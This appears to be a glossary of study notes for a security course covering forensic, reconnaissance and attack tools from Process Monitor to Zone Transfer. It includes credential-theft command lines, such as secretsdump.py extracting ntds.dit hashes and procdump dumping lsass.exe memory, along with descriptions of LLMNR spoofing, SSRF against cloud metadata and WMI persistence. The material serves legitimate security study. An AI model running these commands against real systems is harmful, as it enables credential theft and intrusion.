`Process Monitor`; (Windows - Sysinternals) Shows file system, registry, network, and process information in real time. [1:46,1:82-84]



* `Built in Tools`; 
    * `File Summary`; Shows distinct files. [1:83]
    * `Network summary`; Shows the distinct network addresses visited. [1:83]
    * `Process Activity Monitor`; Shows a summary count of the different categories of activity. [1:83]
    * `Process Tree`; Visually see which processes spawned other processes. [1:84]
    * `Registry Summary`; Shows each distinct registry key that was accessed, and a count of how many times it was referenced. [1:83]

`ps`; Report a snapshot of the current processes.



* `Example`;
    * An attacker accessed a system through normal mechanisms as a non-privileged user and modified an application. The system administrator removed the change and recovered the host. The admin can use the ps command to determine if the attacker was able to compromise the system in the same way. 

`PsExec`; Provides remote command execution. 

`Q`


---

`R`


---

`Rainbow Tables`; Table map hashes to passwords, so you look up the hash in a massive table to determine the password. [3:18]

`Raw Format`; When imaging a disk the advantage of using the raw format is that every forensic tool can read it. Just a copy of all the ones and zeros in the exact same order as they appeared in the source device. Disadvantages are, no checksums, no additional metadata about when and how the image was collected. 

`Reconnaissance`; Building intel, looking for opportunities. Usually begins with OSINT collection. Can look at job postings for clues regarding infrastructure and equipment. Involves little or no direct interaction with the attack targets.  [2:18]



* `Tools`;
    * `SpiderFoot`; Open-Source, OSINT data collection and analysis tool. [2:25-27]
    * `Google Dorks`; Using Google search modifiers, attackers can use Google to identify and collect useful reconnaissance information. [2:43]
    * `Fast Google Dork Scan (FGDS)`; A script that uses Google Dorks and a target domain to acquire information. [2:43]

`Reflected Cross-Site Scripting (XSS)`; The attacker identifies a vulnerability in the URL parameters of a page (GET-based). Attacker sends URL to victim with the crafted parameters. Targeted attack. [4:58 | 5:56 | 6:35]

`Regshot`; Takes and compares a snapshot of the registry and optional file system. [1:80]

`Responder.py`; Attackers can run Responder, wait for and respond to LLMNR requests, and pretend to be a Windows SMB server. (See Hijacking Attacks) [5:31-33]

`RITA`; Real.Intelligence.Threat.Analytics. Uses statistical threat identification to analyze data over time for threat hunting. Detects known and yet-undiscovered attacker C2. (See Zeek) [5:56-63]



* `Notes`;
    * `Beacons`; A characteristic of C2 frameworks where a compromised system reaches out to the controlling server with a periodic frequency. [5:59-60]
    * `DNS Analysis`; Exploded DNS analysis shows the unique subdomain count and reference. [5:61]

`rpcclient`; Used to connect and gather information via SMB sessions from Linux to Windows. [2:91]



* `Commands`;
    * `enumdomusers`; List users. Shows users defined locally on the machine and any domain users the system knows about. [2:91]
    * `enumalsgroups domain | builtin`; List groups (enum alias group). Shows groups defined on the box.  [2:91]
    * `lsaenumsid`; Show all users SIDs defined on the box. Shows the Security Identifier of all users defined locally on the target Windows machine. [2:91]
    * `lookupnames _name_`; Show SID associated with user or group names. See the SID for a username that you provide. [2:91]
    * `lookupsids _sid_`; Show username associated with SID. Converts a username you provide into the SID on the target machine. [2:91]
    * `srvinfo`; Show OS type and version. [2:91]
* `Examples`:
    * `rpcclient -U fezzik florin & enumdomusers`; Enumerating users defined locally on the target server as well as any domain users the system knows about.

`S`


---

`Scrypt`; Requires many hashing rounds, and it requires a large amount of memory and many lookup operations to be done in serial. This helps defeat GPU-acceleration attacks. (See Bcrypt, PBKDF2, Argon2, Yescrypt) [3:27]

`ScoutSuite (AWS, GCP, Aure)`; Dedicated vulnerability assessment tool for cloud environments. Tool used to perform comprehensive vulnerability assessments of AWS, GCP, and Azure environment. Using APIs exposed by the cloud providers, it gathers configuration data for manual inspection and highlights risk areas. Presents content in HTML and JSON.  [5:88]

`secretsdump.py`; Python script to decrypt NTDS.dit data and extract the password hashes. (See ntdsutil.exe) [3:20]



* `Examples`; 
    * `Extract password hashes`; secretsdump.py -system registry/SYSTEM -ntds “Active Directory/ntds.dit” LOCAL -outputfile customer -history

`Secure Web Gateways`; Are proxies that protect an enterprises assets from security issues on third-party websites. 

`Security Responsibility Demarcation`; All cloud providers work with a _shared responsibility model_ for security, where the cloud provider is responsible for some security considerations and the customer is responsible for the rest. [1:90]

`Server Name Indication (SNI)`; Is an extension to the Transport Layer Security (TLS) computer networking protocol by which a client indicates which hostname it is attempting to connect to at the start of the handshaking process. 

`Server-Side Request Forgery (SSRF)`; Allow an attacker to make http requests from a server, obtaining results. Allows an attacker to manipulate the server to change _what _it requests. Significant cloud impact due to Instance Metadata (IMDS). [4:83-96]



* `Notes`;
    * `Reference`; Exfiltrating Data from Cloud Targets. [4:89]
    * `Reference`; SSRF and Cloud Target Access. [4:93]

`Server-Side Request Forgery (SSRF) Defending`; Enumerate the inputs to the system mto identify any possible URLs. Monitor Web Logs. Require IMDSv2 for AWS. [4:94]

`Session Hijacking`; Access to the web server authenticated as the victim.  



* `Example`; Malicious URL that send user cookie data back to hacker. 

`Shadow Admin`; Is an administrative account where the account has administrative capabilities without being expressly authorized as an administrator. [5:79]

`SharpView`; A standalone EXE tool to enumerate different windows domain and server settings. [2:88]



* `Options`; 
    * `Get-DomainUser`; List of all domain users. [2:88]
    * `Get-DomainGroup`; List of all the domain groups. [2:88]
    * `Get-NetComputer`; List of all the computers registered in the domain including the operating system level. [2:88]

`Silent Process Exit`; A built-in function within the Windows OS that is commonly used by developers to write and troubleshoot code. Attackers can leverage this feature to launch a reverse shell when a process that they have chosen has exited. 

`smb`; Application layer protocol that implements file and printer sharing, domain auth, remote admin, and other features. Supported in Linux and UNIX via Samba (smbclient, smbmount, rpcclient). (`Ports 135-139, 445`). [1:40 | 2:83-95]



* `Note`: You can create a list of domain users if you have a valid user’s credentials. 
* `Note`; Domain controllers are most likely to have a business need to receive inbound SMB connections. 
* `Reference`; Establishing an SMB Session from Windows. [2:84]
* `Reference`; Interrogating Targets via SMB Sessions. [2:85]
* `Reference`; SMB Password Guessing. [2:86]
* `Reference`; Establishing SMB Sessions from Linux. [2:90]
* `Reference`; Using Samba’s rpcclient from Linux for More info. (See rpcclient) [2:91]
* `Reference`; Seeing and Dropping SMB Sessions. [2:92]
* `Reference`; Defense Against Evil SMB Sessions. [2:93-94]

`Smbclient`; Allows for an interactive SMB session. 

`SpiderFoot`; Open-Source, OSINT data collection and analysis tool. [2:25-27]

`SQL`; A Semi-colon (;) is used to properly terminate a SQL query. A -- acts as a comment delimiter and can therefore be used to tell the database to ignore anything passed to it after the user’s input.  

`SQL (Structured Query Language) Injection`; Targets the supporting database, commonly a separate system. SQL statements are divided into three parts: VERB, SOURCE, REFINEMENT. [4:66-80]



* `Notes`;
    * `Reference`; SQL Examples. [4:67]
    * `Reference`; Injecting SQL Content. [4:68-69]
    * `Reference`; SQL UNION Statement. [4:70-71]

`SQL (Structured Query Language) Injection Defenses`; Limit permissions of the web app. Teach developers to use _parameterized _queries, and monitor for error logging. [4:78]

`SQL Parameterized Stored Procedures`; Used to help defend against blind SQL injection attacks. 

`Sqlmap`; Automated SQL injection scanning. [4:72-73]



* `Notes`;
    * Always use a valid, non-error-generating URL with sqlmap. [4:73]
    * Always put the URL in quotes. [4:73]
    * `Reference`; Sqlmap Enumeration. [4:74]
    * `Reference`; Cloud SQL Does Not Escape Vulnerability. [4:76]

`Squid`; Open-source web proxy. Squid can cache requests, log user agent strings and supports several protocols.(See Web Proxies) [1:57]

`SRUM Dump`; System.Resource.Usage.Monitor.Dump. Built into Windows, part of the diagnostic policy service. Maintains a 30-day historical record. Extracts data from the SRUDB.dat file. [4:34-40]



* `SRUM Data Storage`; C:\Windows\System32\SRU\SRUDB.dat. [4:35]

`SSH`;



* `Examples`; 
    * `ssh -L [Listening Port]:[Host]:[Exit Port] [UserName]@[IP] `
    * `Ssh -L 8000:8080:10.10.10.100:80 keysersoze@10.10.10.11`; Will establish an SSH port forward, using local port 8000 to a web server at 10.10.10.100:80. 

`Stored Cross-Site Scripting (XSS)`; The attacker uploads and stores malicious code on the server. Opportunistic attack and not specifically targeted. (See Reflected XSS and XSS) [4:55]

`Summarized Logs`; Sending logs to a different server prevents attackers ability to modify the logs. (IncludeConfig /etc/rsyslog.d/*.conf & *.* @[IP])



* `Examples`; 
    * `Zone Transfer Requests to DNS Serve`r; Large number of packets from an Ahost traveling to your primary DNS server with a destination port of (TCP 53) 
    * `The following command was executed on a host by an attacker. Passwords were being extracted`; C:\temp> procdump64.exe -accepteula -ma lsass.exe lsass.dmp

`svchost.exe`; There will always be multiple instances of svchost.exe running on a workstation. 

`Sysinternals`; A suite of tools for Incident Response and Detection. [1:46]

`Sysmon`; Collects detailed event information for system monitoring and analysis. Monitors and reports system activity using the Windows Event Log. [1:46]

`T`


---

`tcpdump`; CLI to capture and display network traffic. (see Berkeley Packet Filter (BPF) [1:53]



* `Examples`; 
    * `tcpdump -i eth0 -w capture.pcap`; Save a packet capture in PCAP format. 
* `tcpdump -i _interface_`; Capture traffic for an interface. Can also use _any_. [1:54]
* `tcpdump -i _interface _-w _file_`; Capture traffic for an interface and write to a file. [1:54]
* `tcpdump -r _file _-n`; Read packets from a file and don’t resolve hosts and ports. [1:54]
* `tcpdump -r _file _-n -A`; Read packets from a file. Don’t resolve, show ASII. [1:54]
* `tcpdump -n -r dmz.pcap ‘not src host 192.168.1.32 and dst host 10.10.0.1’`; Isolates packets coming from anywhere other than 192.168.1.32 and going to 10.10.0.1. 

`TCP Three-Way-Handshake`; All legitimate TCP connections are established through this handshake. [2:59]



* `Six control bits describe the packet’s role in the connection`;
    * `SYN`; Synchronize [2:59]
    * `ACK`; Acknowledgement [2:59]
    * `FIN`; Graceful end to a connection [2:59]
    * `RESET (RST)`; Tear down a connection [2:59]
    * `URG`; Urgent data is included [2:59]
    * `PUSH`; Data should be pushed through the TCP stack [2:59]

`TCPView`; Maps listening and active TCP and UDP activity to the associated applications. [1:46]

`THC Hydra`; Online password guessing tool. [3:6]

`Traceroute`; Sends packets with small Time to Live (TTL | IPv4) or Hop Limit (IPv6) values. Returns Time Exceeded messages.  [2:54]

`TLS-Scan`; Scans a list of TLS servers and collects certificate, and cipher details. Saves scans in JSON format. (See EyeWitness) [2:74]

`TTL`; Time to live was created so that packets would have a finite lifetime (up to 255 hops). Once the TTL is decremented to 0 it will no longer be passed to another router. 

`Types of Attackers`; [2:18]



* `Non-discriminating Attackers`; Look for low-hanging fruit, and may skip reconnaissance. (Sometimes called _script-kiddies_) [2:18]
* `Attackers out to get a particular site`; Reconnaissance is extremely important. [2:18]

`U`


---

`UNIX and LINUX Password Hashes`; [3:23]



* `Example`; 
    * sec580:`$`1`$`5XEtFMh0`$`5t7Dwuf4pBFEbvtGCkQn90:17315:0:99999:7:::

`User Agent Strings`; 



* `Examples`;
    * `Examination of lower frequency user agent strings in a data set indicates`; Unapproved software in use. Reviewing user agent strings from squid logs or web server logs is a technique used to identify outlier or infrequently used clients. Malware or attackers could use unusual strings and give the incident handlers an idea of where they were coming from or what external resources they were accessing. 

`V`


---

`Velociraptor`; A asynchronous VQL(Velociraptor Query Language) endpoint allowing an admin to query systems to collect information. IR teams can use Velociraptor to interrogate client devices. [1:25] 

`Virtual Python Environment`; Used to avoid a problem of conflicting library requirements for different tools. [1:63] 

`VirusTotal`; An online tool to run a specimen through several antivirus engines (See also Hybrid Analysis). [1:75]

`Volatility`; A Python framework/tool for analyzing memory. (--info for full list)[1:63-69]
* `cmdline`; Shows the process ID, and command line for processes that were running when the image was collected. [1:69]
* `dlllist`; Shows the names of the shared libraries associated with an executable. List libraries (DLLs) for each process. [1:70]
* `hivelist`; Retrieve information from the registry. [1:70]
* `netscan`; CAn find information about listening sockets that have been closed. Scans through memory looking for data structures related to networking, both active network connections and listening sockets. (File names are truncated to 14 characters) [1:68]
* `printkey`; Retrieve information from the registry. [1:70]
* `pslist`; Lists processes similar to tasklist. Enumerate the EPROCESS structure. [1:66]
* `psscan`; Display process information using non-conventional memory analysis (possibly identifying detection evasion techniques). The PPID and PID for a process cannot be identical.  [1:71]
* `pstree`; Creates a visual representation (in text) of the parent-child relationship for running processes. Used to identify applications that are launched from other applications. [1:67]
* `svcscan`; Display Windows Services [1:71]
* `userassist`; List programs started from the GUI. [1:70]

`W`

---

`Watering Hole Attacks`; A targeted drive-by attack. (Victims are targeted by adding malicious code to sites within specific vertical) 

`Web Application Firewalls`; Focus on HTTP/HTTPs conversation for changes in state, preventing application attacks like cross-site scripting and SQL injection. 

`Web Proxies`; Cache web pages, and filter out inappropriate websites. (See Squid) [1:57]

`Web Based Recon/Attack Tools`; Many Websites offer the ability to research or even attack other sites. [2:45-46]

`Website Crawling`; The process of crawling a website and gathering information. [2:42]

* `Tools`;
    * `CeWL (Custom Word List Generator)`; Crawls a target website and collects all webpage and document data. CeWL uses this data to build several lists. [2:42]

`Website Reconnaissance`; Browsing the target's website and doing a target search can provide valuable information. [2:40]

`Website Reconnaissance Defense`; Limit and control information, limit data indexed by search engines using robots.txt, and look for web spider/crawler activity. [2:47]

`WeirdAAL Enumeration`; Enumerates AWS access with credentials in .env. (See AzureStealth) [5:78]

`whois`; Data that used to be a valuable source of email, phone, and address data. GDPR compliance ended that run. [2:20] 

`Windows Event ID`; 

* `IDs`;
    * `4688`; Monitored to track programs that are executed, who the program ran as, and the process that was created. 
    * `4634`; Indicates an account that logged off a system.
    * `4768`; Indicates that a Kerberos authentication ticket was requested.
    * `4732`; Indicates that an account was added to a security-enabled local group. 

`WinPmem`; Tool to capture RAM from a Windows system. [1:62]

`WMI Event Subscription`; Windows Management Instrumentation (WMI) events allow programs to subscribe to events and execute code.  Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a WMI event subscription. MOF language is compiled and executed using mofcomp.exe. [5:43]

`wmic`; Provides access to _very _detailed information about running processes. [1:36]

* `Example`;
    *  `wmic process list full`; Used to output detailed output of running processes.

`X`

---
`XSS`; Allows an attacker to send custom commands on behalf of the server to the victim. [4:54]

`Y`

---

`Yescrypt`; Designed to require very large lookup tables for hash calculation, typically in the tens of gigabytes. (See Bcrypt, Scrypt, Argon2, PBKDF2) [3:27]

`Z`

---

`Zeek`; Read a packet capture file. (See Rita) [5:58]

`Zenmap`; GUI version of nmap with additional features such as a visual topology. (See nmap) [2:56]

`Zone Transfer`; <span style="text-decoration:underline;">TCP Port 53</span>. Allows an attacker to connect to your DNS server and grab all records associated with a particular domain. (see nslookup/dig) [2:33-34]
